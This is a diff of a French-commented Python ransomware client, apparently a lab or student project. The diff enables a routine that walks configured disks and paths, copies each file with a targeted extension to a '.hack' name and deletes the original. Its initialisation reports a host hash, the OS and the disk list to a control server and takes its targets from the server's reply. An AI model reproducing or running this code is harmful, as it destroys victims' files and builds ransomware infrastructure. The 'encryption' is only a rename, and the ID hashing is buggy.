@@ -10,6 +10,8 @@ from os import path
 import random
 import shutil
 import psutil
+import re
+from time import time
 
 # Constantes
 DEBUG_MODE = False
@@ -38,6 +40,7 @@ def initialize():
 
     # Détermine les disques disponibles
     disks = list_disks()
+    print(disks)
 
     # Construction du message d'initialisation du RANSOMWARE
     msg = message.set_message("initialize_req", [hash, os, disks])
@@ -51,12 +54,13 @@ def initialize():
 
     # Envoi de la demande d'initialisation vers le serveur frontal
     network.send_message(conn_frontal, msg)
-    print("Le message : " + str(msg) + "est envoyé")
+    print("Le message : " + str(msg) + "est envoyé") # Il envoie ini req avec le hash dedans
 
     # Réception de la configuration
     msg = network.receive_message(conn_frontal)
     msg_type = message.get_message_type(msg)
     if msg_type == 'INITIALIZE_RESP':
+        print("Message reçu est INI_RESP")
         # Fermeture de la connexion avec le serveur frontal
         conn_frontal.close()
 
@@ -116,32 +120,33 @@ def file_type(fichier):
 
 
 def chiffre(fichier_source):
-    # if not os.path.exists(fichier_source):
-    #     print("Le fichier spécifié n'existe pas.")
-    #     return
-    #
-    # if not os.path.isfile(fichier_source):
-    #     print("Le chemin spécifié ne correspond pas à un fichier.")
-    #     return
-    #
-    # # Obtient le nom du fichier sans extension
-    # nom_fichier, extension = os.path.splitext(fichier_source)
-    # # Crée le nouveau nom de fichier avec l'extension .hack
-    # fichier_cible = nom_fichier + ".hack"
-    #
-    # # Copie le contenu du fichier source vers le fichier cible
-    # shutil.copyfile(fichier_source, fichier_cible)
-    # print(f"Fichier copié de {fichier_source} vers {fichier_cible}")
-    #
-    # # Supprime le fichier source
-    # os.remove(fichier_source)
-    # print(f"Fichier source {fichier_source} supprimé.")
-    return None
+    if not os.path.exists(fichier_source):
+        print("Le fichier spécifié n'existe pas.")
+        return ""
+
+    if not os.path.isfile(fichier_source):
+        print("Le chemin spécifié ne correspond pas à un fichier.")
+        return ""
+
+    # Obtient le nom du fichier sans extension
+    nom_fichier, extension = os.path.splitext(fichier_source)
+    # Crée le nouveau nom de fichier avec l'extension .hack
+    fichier_hacker = nom_fichier + ".hack"
+
+    # Copie le contenu du fichier source vers le fichier cible
+    shutil.copyfile(fichier_source, fichier_hacker)
+    print(f"Fichier copié de {fichier_source} vers {fichier_hacker}")
+
+    # Supprime le fichier source
+    os.remove(fichier_source)
+    print(f"Fichier source {fichier_source} supprimé.")
+    return 1
 
 
 def simulate_hash(longueur=0):
-    letters = string.hexdigits
-    return ''.join(random.choice(letters) for i in range(longueur))
+    identifiant = f'{node()}{time()}'
+    print(identifiant)
+    return sha256(bytes()).hexdigest()
 
 
 def main():
@@ -163,26 +168,45 @@ def main():
     if LAST_STATE is None:
         initialize()
 
-    if LAST_STATE == 'INITIALIZE'   :
+    if LAST_STATE == 'INITIALIZE' :
         state_config = config.get_config('LAST_STATE')
         if state_config != "INITIALIZE" and state_config != "CRYPT" and state_config != "PENDING":
             return None
-
-        disks = config.get_config('DISKS')
-        paths = config.get_config('PATHS')
-        file_ext = config.get_config('FILE_EXT')
-        nb_files_encrypted = config.get_config('NB_FILES_ENCRYPTED')
+        else:
+            disks = config.get_config('DISKS')
+            paths = config.get_config('PATHS')
+            file_ext = config.get_config('FILE_EXT')
+            nb_files_encrypted = config.get_config('NB_FILES_ENCRYPTED')
         if nb_files_encrypted is None:
             nb_files_encrypted = 0
 
-        for disk in disks:
+        disques = [chaine.replace("'", "") for chaine in disks]
+        # Enlever les guillemets simples extérieurs de chaque élément de la liste
+        extensions = []
+
+        for element in file_ext:
+            # Supprimer tous les guillemets simples de chaque extension et diviser la chaîne par la virgule
+            extensions.extend(element.replace("'", "").split(','))
+        print(extensions)
+
+        chemin = []
+
+        for element in paths:
+            # Supprimer tous les guillemets simples de chaque extension et diviser la chaîne par la virgule
+            chemin.extend(element.replace("'", "").split(','))
+
+        print(chemin)
+        # Enlever les guillemets simples extérieurs de chaque élément de la liste
+        for disk in disques:
             os.chdir(disk)
-            for folder_path in paths:
+            print(disk)
+            for folder_path in chemin:
                 for (root, dirs, files) in os.walk(folder_path, topdown=True):
                     for filename in files:
-                        if os.path.splitext(filename)[1] in file_ext:  # Si l'extension est dans les types à chiffrer
-                            #nb_files_encrypted += chiffre(f"{root}\{filename}")
-                            print(filename)
+                        print(filename)
+                        if os.path.splitext(filename)[1] in extensions:  # Si l'extension est dans les types à chiffrer
+                            print(f"{root}\{filename}")
+                            nb_files_encrypted += chiffre(f"\{root}\{filename}")
             print(f"Le ransomware a chiffré {nb_files_encrypted} fichiers.")
         print("Chiffrement fait ? ")
 
